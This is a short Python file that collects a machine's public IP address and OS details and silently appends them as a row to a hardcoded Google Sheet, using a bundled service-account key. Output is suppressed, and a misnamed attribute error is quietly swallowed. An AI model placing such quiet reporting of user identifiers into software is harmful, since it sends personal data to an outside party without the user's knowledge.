import sys
import os
import ctypes
import platform

class SystemInformation:
    def __init__(self):
        self.os = self._os_version().strip()
        self.cpu = self._cpu().strip()
        self.node = platform.node()

    def _os_version(self):
        return platform.platform()

    def _cpu(self):
        return platform.machine()

def get_system_info():
    import pygsheets
    import ipgetter
    import io
    from contextlib import redirect_stdout

    root_dir = os.path.dirname(os.path.abspath(__file__))
    key_file = os.path.join(root_dir, "key.json")

    f = io.StringIO()

    sh = None
    with redirect_stdout(f):
        gc = pygsheets.authorize(service_file=key_file)
        sh = gc.open_by_key("1sVjzu5WasiOKXBOjMWrPzKcXFd-NZ4Gt6CVyyrZa15Y").worksheet('index', 0)

    data = []
    ip = ipgetter.myip()
    data.append(ip)
    try:
        s = SystemInformation()
        data += [s.os, s.s_cpu]
    except Exception as e:
        pass
    if sh:
        sh.insert_rows(row=1, values=data)
